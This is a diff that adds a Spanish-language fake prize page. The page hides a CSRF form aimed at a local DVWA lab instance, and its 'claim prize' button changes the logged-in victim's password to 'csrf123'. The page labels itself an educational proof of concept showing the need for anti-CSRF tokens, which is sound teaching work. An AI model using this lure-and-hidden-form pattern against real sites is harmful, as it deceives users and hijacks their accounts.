@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <title>¡Felicidades, ganaste un premio!</title>
+  <style>
+    body { font-family: -apple-system, Arial, sans-serif; text-align: center; margin-top: 60px; background:#f5f5f5; }
+    .card { background:#fff; display:inline-block; padding:40px 60px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,.1); }
+    button { padding:14px 28px; font-size:18px; background:#2d7; border:none; border-radius:8px; cursor:pointer; color:#063; font-weight:bold; }
+    .nota { color:#999; margin-top:40px; font-size:13px; max-width:420px; margin-left:auto; margin-right:auto; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>🎉 ¡Felicidades! Has ganado un premio 🎉</h2>
+    <p>Haz clic en el botón para reclamarlo.</p>
+
+    <!-- Formulario oculto de CSRF: apunta a DVWA y cambia la contraseña -->
+    <form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
+      <input type="hidden" name="password_new" value="csrf123">
+      <input type="hidden" name="password_conf" value="csrf123">
+      <input type="hidden" name="Change" value="Change">
+      <button type="submit">🎁 Reclamar premio</button>
+    </form>
+  </div>
+
+  <p class="nota">
+    (Prueba de concepto educativa de CSRF. En realidad este botón envía una petición
+    a DVWA que, si tienes la sesión abierta, cambia tu contraseña a <b>csrf123</b>
+    sin tu consentimiento. Demuestra por qué hacen falta tokens anti-CSRF.)
+  </p>
+</body>
+</html>
